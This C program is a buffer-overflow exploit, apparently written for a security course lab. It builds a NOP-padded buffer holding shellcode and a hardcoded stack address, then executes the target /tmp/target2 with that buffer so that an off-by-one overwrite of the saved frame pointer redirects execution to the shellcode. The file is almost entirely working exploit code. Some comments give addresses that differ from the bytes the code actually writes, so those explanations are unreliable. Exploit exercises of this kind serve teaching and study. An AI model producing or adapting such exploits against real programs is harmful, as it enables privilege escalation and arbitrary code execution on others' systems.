#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define NOP 0x90
#define SIZE 201

int main(void)
{
  char *args[3];
  char *env[1];
  /* expolit is of type:
   * nops _____ shellcode _____ shellcode_address ______ %ebp changing byte
   *
   */ 
  char buffer[SIZE]; // 1 for NULL
  memset(buffer, NOP, SIZE);


  // EBP is at 0xbffff99c  val changed into: 0xbffff941
  // buffer is 0xbffff8d4
  // Value to be written in the changed ebp si 0x9c - 0x04 (0xbffff998) == 0x98
  //
  // addr to shell code is needed to be placed at 0xbffff998, since we have no
  // ops, that address can be 0xbffff8d8
  // A8 - 4 because of pop instruction.
  buffer[SIZE - 1] = 0xA4;

  buffer[SIZE - 2] = 0xbf;
  buffer[SIZE - 3] = 0xff;
  buffer[SIZE - 4] = 0xfc;
  buffer[SIZE - 5] = 0xf4;

  
  // Add the shellcode.
  int i = SIZE - 5 - strlen(shellcode);
  memcpy(buffer + i, shellcode, strlen(shellcode));

  args[0] = TARGET; 
  
  args[1] = buffer; 
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}                        
